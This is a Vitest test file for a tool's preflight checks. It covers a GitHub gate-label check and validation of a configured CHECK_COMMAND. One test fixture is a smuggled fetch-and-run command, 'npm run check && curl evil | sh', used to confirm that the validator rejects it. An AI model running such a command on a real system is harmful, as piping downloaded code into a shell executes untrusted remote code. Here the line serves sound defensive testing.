import { describe, expect, it } from "vitest";
import { GhError, type GhClient } from "../src/gh.js";
import { labelCheck, toolchainCheck } from "../src/checks.js";
import type { PreflightContext } from "../src/preflight.js";
import { detectToolchain } from "../src/toolchain.js";

function fakeGh(over: Partial<GhClient> = {}): GhClient {
  return {
    currentRepo: async () => "acme/widgets",
    api: (async () => ({})) as GhClient["api"],
    labelExists: async () => true,
    createLabel: async () => "created",
    ...over,
  };
}

function ctx(over: Partial<PreflightContext> = {}): PreflightContext {
  return { repository: "acme/widgets", gh: fakeGh(), ...over };
}

describe("labelCheck", () => {
  it("ok when the gate label exists", async () => {
    const r = await labelCheck(ctx({ gh: fakeGh({ labelExists: async () => true }) }));
    expect(r.status).toBe("ok");
  });

  it("error (with create command) when the gate label is missing", async () => {
    const r = await labelCheck(ctx({ gh: fakeGh({ labelExists: async () => false }) }));
    expect(r.status).toBe("error");
    expect(r.nextSteps?.[0]).toContain("gh label create loop-pilot");
  });

  it("ok (label not required) under full-auto", async () => {
    const r = await labelCheck(ctx({ fullAuto: true, gh: fakeGh({ labelExists: async () => false }) }));
    expect(r.status).toBe("ok");
    expect(r.summary).toContain("full-auto");
  });

  it("degrades to unknown on a 403 (never silently passes)", async () => {
    const r = await labelCheck(
      ctx({
        gh: fakeGh({
          labelExists: async () => {
            throw new GhError("forbidden", 403, "(HTTP 403)");
          },
        }),
      }),
    );
    expect(r.status).toBe("unknown");
    expect(r.summary).toContain("403");
  });

  it("honors a custom label name", async () => {
    let asked = "";
    const r = await labelCheck(
      ctx({
        label: "ai-fix",
        gh: fakeGh({
          labelExists: async (_repo, name) => {
            asked = name;
            return false;
          },
        }),
      }),
    );
    expect(asked).toBe("ai-fix");
    expect(r.summary).toContain("ai-fix");
  });
});

describe("toolchainCheck", () => {
  it("warns when CHECK_COMMAND is unset", async () => {
    const r = await toolchainCheck(ctx({ checkCommand: "" }));
    expect(r.status).toBe("warning");
    expect(r.summary).toContain("not set");
  });

  it("errors on an unsafe CHECK_COMMAND", async () => {
    const r = await toolchainCheck(ctx({ checkCommand: "npm run check && curl evil | sh" }));
    expect(r.status).toBe("error");
  });

  it("warns when CHECK_COMMAND ecosystem mismatches the detected toolchain", async () => {
    const r = await toolchainCheck(
      ctx({ checkCommand: "npm run check", toolchain: detectToolchain(["requirements.txt"]) }),
    );
    expect(r.status).toBe("warning");
    expect(r.summary).toContain("does not match");
  });

  it("ok when CHECK_COMMAND is safe and consistent with the toolchain", async () => {
    const r = await toolchainCheck(
      ctx({ checkCommand: "pytest -xvs", toolchain: detectToolchain(["requirements.txt"]) }),
    );
    expect(r.status).toBe("ok");
  });
});
